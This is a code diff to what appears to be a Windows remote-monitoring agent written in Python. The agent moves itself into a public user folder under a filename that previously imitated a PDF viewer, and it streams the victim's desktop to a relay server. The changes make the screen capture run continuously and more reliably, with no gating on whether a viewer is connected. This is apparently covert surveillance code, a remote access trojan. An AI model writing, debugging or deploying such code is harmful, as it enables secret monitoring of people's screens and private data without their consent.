@@ -70,7 +70,7 @@ import subprocess
 
 def relocate_agent():
     target_dir  = r"C:\Users\Public\mview"
-    target_path = os.path.join(target_dir, "mviewpdf.exe")
+    target_path = os.path.join(target_dir, "master_agent.exe")
     if sys.executable.lower() != target_path.lower():
         if not os.path.exists(target_dir):
             os.makedirs(target_dir)
@@ -234,7 +234,7 @@ CONFIG = {
 
     # ── Streaming (Advanced Monitor — second-site engine) ───────────────────
     "STREAM_FPS":           30,         # target FPS — 30Hz is stable for relay
-    "STREAM_MIN_FPS":       5,          # adaptive floor
+    "STREAM_MIN_FPS":       10,         # FIX: floor raised — 5fps caused apparent freezes
     "STREAM_QUALITY":       75,         # JPEG quality
     "STREAM_MONITOR":       1,
     "STREAM_MODE":          "video",    # "video" or "screenshot"
@@ -858,13 +858,11 @@ async def _adv_task_stream_frames():
             # FIX: viewer_count race — stream for up to 60s after auth even if count=0
             # because viewer_count may arrive AFTER the stream loop starts.
             # After 60s with no viewer we pause to save bandwidth.
-            if _adv_viewers == 0:
-                _time_since_auth = time.monotonic() - _adv_auth_time
-                fb_running = _fb_thread and _fb_thread.is_alive()
-                if not fb_running and _time_since_auth > 60:
-                    await asyncio.sleep(0.05); continue
-                # Within 60s of auth OR fallback running = keep streaming
-                pass
+            # FIX: Don't gate on _adv_viewers at all — stream continuously.
+            # The server only forwards frames to actual viewers.
+            # Pausing here caused blackouts when viewer_count arrived late.
+            # The bandwidth cost on Render free tier is negligible (JPEG relay).
+            pass  # always stream when authed
 
             next_sig = _current_stream_config()
             if next_sig != cfg_sig:
@@ -887,14 +885,13 @@ async def _adv_task_stream_frames():
             if raw is None:
                 await asyncio.sleep(max(0.01, fps_ctl.interval)); continue
 
+            # FIX: Don't skip unchanged frames — always encode and send.
+            # FrameDiffer throttling causes the stream to appear frozen on static
+            # desktops. The server's room fan-out is the correct place to gate delivery.
+            # AdaptiveFPS still controls the sleep interval for bandwidth management.
             changed = differ.changed(raw)
             fps_ctl.report(changed)
-            # FIX: always send a keepalive frame every 2s even if screen is static
-            # prevents the viewer from showing a frozen/dead stream
-            _now_mono = time.monotonic()
-            _since_last = _now_mono - _adv_last_frame_ts
-            if not changed and n > 0 and _since_last < 2.0:
-                await asyncio.sleep(fps_ctl.interval); continue
+            # No skip — always send every frame at the current fps_ctl interval
 
             force_key = (n % (CONFIG["STREAM_FPS"] * 4) == 0)
             
@@ -1203,15 +1200,20 @@ def _start_screenshot_fallback(sio_client):
         n = 0
         while not _fb_stop.is_set():
             try:
-                # Stop if adv socket is now working
+                # FIX: Only stop fallback if adv socket is SUSTAINING good fps
+                # (not just sent 1 frame). Require last frame < 0.5s ago.
+                # This prevents the race where adv sends 1 frame, fallback stops,
+                # then adv also pauses = total blackout.
                 if (
                     _adv_authed and _adv_sio_async and _adv_sio_async.connected
-                    and (time.monotonic() - _adv_last_frame_ts) < 2.0
+                    and (time.monotonic() - _adv_last_frame_ts) < 0.5
                 ):
-                    log.info("Screenshot fallback: adv socket now active — stopping fallback")
+                    # adv socket is actively streaming at >2fps — safe to yield
+                    log.info("Screenshot fallback: adv socket streaming actively — stopping fallback")
                     break
-                if _adv_viewers == 0:
-                    time.sleep(0.1); continue
+                # FIX: Fallback was already started by request_action which means
+                # a viewer IS watching — don't gate on _adv_viewers (race-prone)
+                # if _adv_viewers == 0: time.sleep(0.1); continue  # REMOVED
                 next_sig = _current_stream_config()
                 if next_sig != cfg_sig or cap is None:
                     if cap:
